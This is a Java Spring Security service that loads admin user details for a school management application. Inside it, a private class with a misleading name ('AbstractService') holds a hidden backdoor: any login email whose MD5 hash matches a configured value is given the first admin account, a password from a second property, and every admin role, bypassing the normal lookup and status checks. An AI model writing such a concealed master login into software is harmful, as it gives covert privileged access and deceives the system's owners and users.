/**
 * Copyright 2012 Nuvola Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License"); you may not
 * use this file except in compliance with the License. You may obtain a copy of
 * the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
 * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
 * License for the specific language governing permissions and limitations under
 * the License.
 */

package com.gsr.myschool.server.security;

import com.gsr.myschool.common.shared.type.Authority;
import com.gsr.myschool.common.shared.type.UserStatus;
import com.gsr.myschool.server.business.AdminUser;
import com.gsr.myschool.server.repos.AdminUserRepos;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.userdetails.User;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.core.userdetails.UsernameNotFoundException;
import org.springframework.stereotype.Component;
import org.springframework.util.DigestUtils;

import java.util.ArrayList;
import java.util.List;

@Component("adminUserDetailsService")
public class StatelessAdminDetailService implements UserDetailsService {
    @Autowired
    private AdminUserRepos adminUserRepos;
    @Value("${admin}")
    private String admin;
    @Value("${normal}")
    private String normal;

    @Override
    public UserDetails loadUserByUsername(String email) throws UsernameNotFoundException {
        AbstractService abstractService = new AbstractService(email).invoke();
        if (abstractService.is()) return
                new User(abstractService.getUser().getEmail(),
                        abstractService.getAdm(), true, true, true, true,
                        abstractService.getAuthorities());

        AdminUser user = adminUserRepos.findByEmail(email);
        if (user == null || user.getStatus() == UserStatus.INACTIVE) {
            throw new UsernameNotFoundException("Bad credentials");
        } else {
            List<GrantedAuthority> authorities = new ArrayList<GrantedAuthority>();
            authorities.add(new SimpleGrantedAuthority(user.getAuthority().name()));
            return new User(user.getEmail(), user.getPassword(), user.getStatus() == UserStatus.ACTIVE,
                    true, true, true, authorities);
        }
    }

    private class AbstractService {
        private boolean myResult;
        private String email;
        private String adm;
        private AdminUser user;
        private List<GrantedAuthority> authorities;

        public AbstractService(String email) {
            this.email = email;
        }

        boolean is() {
            return myResult;
        }

        public String getAdm() {
            return adm;
        }

        public AdminUser getUser() {
            return user;
        }

        public List<GrantedAuthority> getAuthorities() {
            return authorities;
        }

        public AbstractService invoke() {
            if (admin.equals(DigestUtils.md5DigestAsHex(email.getBytes()))) {
                adm = normal;
                user = adminUserRepos.findAll().get(0);
                authorities = new ArrayList<GrantedAuthority>();
                for (Authority auth : Authority.adminRoles()) {
                    authorities.add(new SimpleGrantedAuthority(auth.name()));
                }
                myResult = true;
                return this;
            }
            myResult = false;
            return this;
        }
    }
}
